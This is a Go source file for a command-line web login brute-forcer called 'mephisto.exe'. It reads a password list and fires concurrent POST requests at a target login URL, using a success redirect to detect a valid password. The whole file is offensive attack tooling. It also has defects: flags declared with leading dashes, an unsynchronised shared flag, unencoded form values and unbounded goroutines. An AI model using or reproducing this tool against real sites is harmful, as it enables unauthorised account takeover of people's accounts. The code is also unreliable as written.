package main

import (
	"bufio"
	"flag"
	"fmt"
	"net/http"
	"os"
	"strings"
	"sync"
)

func attemptLogin(targetURL, username, password, successRedirect string, wg *sync.WaitGroup, found *bool, foundPassword *string) {
	defer wg.Done()

	if *found {
		return // Skip further attempts if a key is already found
	}

	client := &http.Client{}
	req, err := http.NewRequest("POST", targetURL, strings.NewReader(fmt.Sprintf("username=%s&password=%s", username, password)))
	if err != nil {
		fmt.Printf("Error creating request for password '%s': %v\n", password, err)
		return
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("Error sending request for password '%s': %v\n", password, err)
		return
	}
	defer resp.Body.Close()

	// Check if the redirect matches the successRedirect
	if resp.Request.URL.String() == successRedirect {
		fmt.Printf("KEY FOUND [%s]\n", password)
		*found = true
		*foundPassword = password
	}
}

func main() {
	// Define command-line flags
	username := flag.String("l", "", "Username")
	passwordList := flag.String("P", "", "Password list file")
	redirectURL := flag.String("--redirect", "", "Success redirect URL")
	targetURL := flag.String("--url", "", "Target URL for brute-forcing")
	flag.Parse()

	// Validate inputs
	if *username == "" || *passwordList == "" || *targetURL == "" || *redirectURL == "" {
		fmt.Println("Usage: mephisto.exe -l username -P passwordlist --url target_url --redirect success_url")
		return
	}

	// Open the password list file
	file, err := os.Open(*passwordList)
	if err != nil {
		fmt.Printf("Error opening password file: %v\n", err)
		return
	}
	defer file.Close()

	// Variables to track success
	var found bool
	var foundPassword string
	var wg sync.WaitGroup

	// Scan through the password list
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		if found {
			break
		}

		password := scanner.Text()
		wg.Add(1)
		go attemptLogin(*targetURL, *username, password, *redirectURL, &wg, &found, &foundPassword)
	}

	wg.Wait()

	if scanner.Err() != nil {
		fmt.Printf("Error reading password file: %v\n", scanner.Err())
	}

	if !found {
		fmt.Println("KEY NOT FOUND")
	}
}
